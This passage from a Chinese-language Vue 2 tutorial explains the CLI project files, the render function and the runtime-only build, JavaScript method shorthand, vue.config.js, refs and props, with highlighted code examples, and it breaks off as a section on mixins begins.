class="hljs-name">School</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School.vue&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">  <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title class_">School</span>,</span><br><span class="language-javascript">    <span class="hljs-title class_">Student</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-id">#app</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">font-family</span>: Avenir, Helvetica, Arial, sans-serif;</span><br><span class="language-css">  -webkit-<span class="hljs-attribute">font-smoothing</span>: antialiased;</span><br><span class="language-css">  -moz-osx-<span class="hljs-attribute">font-smoothing</span>: grayscale;</span><br><span class="language-css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;</span><br><span class="language-css">  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">60px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>main.js:</p><p>入口文件</p><p>Cli5.0.8版本</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">import &#123; createApp &#125; from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>createApp(App).mount(&#x27;#app&#x27;)<br><br></code></pre></td></tr></table></figure><p>Cli4+</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">import Vue from &#x27;vue&#x27;<br>import App from &#x27;./App.vue&#x27;<br><br>Vue.config.productionTip = false<br><br>new Vue(&#123;<br>  render: h =&gt; h(App),<br>&#125;).$mount(&#x27;#app&#x27;)<br><br></code></pre></td></tr></table></figure><p>接下来就要详细讲解 main.js 中的 render 函数</p><h3 id="render函数"><a href="#render函数" class="headerlink" title="render函数"></a>render函数</h3><blockquote><p>插入一个小知识：</p></blockquote><p>使用 import 导入第三方库的时候不需要 加 ‘.&#x2F;’</p><p>导入我们自己写的：</p><p>  ​    import App from ‘.&#x2F;App.vue’</p><p>导入第三方的</p><p>​      import Vue from ‘vue’</p><p>不需要在 from ‘vue’ 加 <code>&#39;./&#39;</code> 的原因是第三方库 node_modules 人家帮我们配置好了。</p><p>我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121422825.png" alt="image-20221124121422825"></p><p>通过 module 确定了我们要引入的文件。</p><blockquote><p>回到 render 函数</p></blockquote><p>之前的写法是这样：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br><span class="hljs-attr">template</span>:<span class="hljs-string">`&lt;App&gt;&lt;/App&gt;`</span>,<br><span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">App</span>&#125;,<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>如果这样子写，运行的话会引发如下的报错</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121513830.png" alt="image-20221124121513830"></p><p>报错的意思是，是在使用运行版本的 vue ，没有模板解析器。</p><p>从上面的小知识可以知道，我们引入的 vue 不是完整版的，是残缺的（为了减小vue的大小）。所以残缺的vue.js 只有通过 render函数才能把项目给跑起来。</p><p>来解析一下render</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// render最原始写的方式</span><br><span class="hljs-comment">// render是个函数，还能接收到参数a</span><br><span class="hljs-comment">// 这个 createElement 很关键，是个回调函数</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params">createElement</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> createElement);<br>      <span class="hljs-comment">// 这个 createElement 回调函数能创建元素</span><br>      <span class="hljs-comment">// 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题</span><br>      <span class="hljs-comment">// createElement 能创建具体的元素</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>)<br>  &#125;<br>&#125;).$mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>因为 render 函数内并没有用到 this，所以可以简写成箭头函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-comment">// render: h =&gt; h(App),</span><br>  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">createElement</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-title class_">App</span>)<br>  &#125;<br>&#125;).$mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></td></tr></table></figure><p>再简写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>  // render: h =&gt; h(App),<br>  render: createElement =&gt; createElement(App)<br>&#125;).$mount(&#x27;#app&#x27;)<br></code></pre></td></tr></table></figure><p>最后把 createElement 换成 h 就完事了。</p><p>算啦算啦，把简写都整理一遍吧，js里的简写确实多哇。</p><p>对象内写方法最原始的：</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: function (salary) &#123;        return &#39;工资&#39; + salary;    &#125;&#125;</code></pre><p>ES6 简化版：</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work(salary) &#123;        return &#39;工资&#39; + salary;    &#125;&#125;</code></pre><p>箭头函数简化版:</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: (salary) =&gt; &#123;        return &#39;工资&#39; + salary;    &#125;&#125;</code></pre><p>箭头函数再简化（最终版）：</p><p>&#x2F;&#x2F; 只有一个参数就可以把圆括号去了，函数体内部只有一个 return 就可以把大括号去掉，return去掉</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: salary =&gt; &#39;工资&#39; + salary;&#125;</code></pre><p>这样就可以理解 render 函数的简写方式了。</p><p>脚手架中的index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 开启移动端的理想视口 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 配置页签图标 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 引入第三方样式 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;css/bootstrap.css&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 配置网页标题 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>硅谷系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当浏览器不支持js时noscript中的元素就会被渲染 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 容器 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="关于不同版本的函数"><a href="#关于不同版本的函数" class="headerlink" title="关于不同版本的函数"></a>关于不同版本的函数</h3><ol><li><p>vue.js与vue.runtime.xxx.js的区别 </p><ul><li><p>vue.js 是完整版的Vue，包含：核心功能+模板解析器</p></li><li><p>vue.runtime.xxx.js 是运行版的Vue，只包含核心功能，没有模板解析器</p></li><li><p>esm 就是 ES6 module</p></li></ul></li><li><p>因为 vue.runtime.xxx.js 没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容</p></li></ol><h3 id="vue-config-js-配置文件"><a href="#vue-config-js-配置文件" class="headerlink" title="vue.config.js 配置文件"></a>vue.config.js 配置文件</h3><p>vue inspect &gt; output.js可以查看到Vue脚手架的默认配置</p><p>使用vue.config.js可以对脚手架进行个性化定制，和package.json同级目录，详见 <a href="https://cli.vuejs.org/zh/config/#vue-config-js">配置参考 | Vue CLI</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">module.exports = &#123;<br>  pages: &#123;<br>    index: &#123;<br>      entry: &#x27;src/index/main.js&#x27; // 入口<br>    &#125;<br>  &#125;,<br>  lineOnSave: false// 关闭语法检查<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-vue-零碎的一些知识"><a href="#2-2-vue-零碎的一些知识" class="headerlink" title="2.2 vue 零碎的一些知识"></a>2.2 vue 零碎的一些知识</h2><h3 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h3><ul><li>被用来给元素或子组件注册引用信息（id的替代者）</li><li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ul><li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code>或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li><li>获取：<code>this.$refs.xxx</code></li></ul></li></ul><blockquote><p>具体案例</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;msg&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;btn&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showDOM&quot;</span>&gt;</span>点我输出上方的DOM元素<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;sch&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//引入School组件</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">School</span>&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">msg</span>:<span class="hljs-string">&#x27;欢迎学习Vue！&#x27;</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">showDOM</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">title</span>) <span class="hljs-comment">//真实DOM元素</span></span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">btn</span>) <span class="hljs-comment">//真实DOM元素</span></span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">sch</span>) <span class="hljs-comment">//School组件的实例对象（vc）</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    </p><h3 id="props配置项"><a href="#props配置项" class="headerlink" title="props配置项"></a>props配置项</h3><p>props让组件接收外部传过来的数据 </p><ol><li><p>传递数据<code>&lt;Demo name=&quot;xxx&quot; :age=&quot;18&quot;/&gt;</code>这里age前加:&#x3D;&#x3D;，通过v-bind使得里面的18是数字</p></li><li><p>接收数据</p><ul><li><p>第一种方式（只接收）props:[‘name’, ‘age’] </p></li><li><p>第二种方式（限制类型）props:{name:String, age:Number}</p></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">props: &#123;<br>    name: &#123;<br>        type: String, // 类型<br>        required: true,// 必要性<br>        default: &#x27;cess&#x27;// 默认值<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><blockquote><p>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p></blockquote><p>示例代码：</p><p>父组件给子组件传数据</p><p>App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Vue logo&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./assets/logo.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;haha&quot;</span> <span class="hljs-attr">:age</span>=<span class="hljs-string">&quot;this.age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School.vue&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">  data () &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">age</span>: <span class="hljs-number">360</span>  </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title class_">School</span>,</span><br><span class="language-javascript">    <span class="hljs-title class_">Student</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-id">#app</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">font-family</span>: Avenir, Helvetica, Arial, sans-serif;</span><br><span class="language-css">  -webkit-<span class="hljs-attribute">font-smoothing</span>: antialiased;</span><br><span class="language-css">  -moz-osx-<span class="hljs-attribute">font-smoothing</span>: grayscale;</span><br><span class="language-css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;</span><br><span class="language-css">  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">60px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校年龄：&#123;&#123; age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;School&quot;</span>,</span><br><span class="language-javascript">  <span class="hljs-comment">// 最简单的写法：props: [&#x27;name&#x27;, &#x27;age&#x27;]</span></span><br><span class="language-javascript">  <span class="hljs-attr">props</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 必须要传的</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">age</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">address</span>: <span class="hljs-string">&quot;北京昌平&quot;</span>,</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title function_">showName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.demo</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="mixin-混入"><a href="#mixin-混入" class="headerlink" title="mixin(混入)"></a>mixin(混入)</h3><p>混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。</p><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 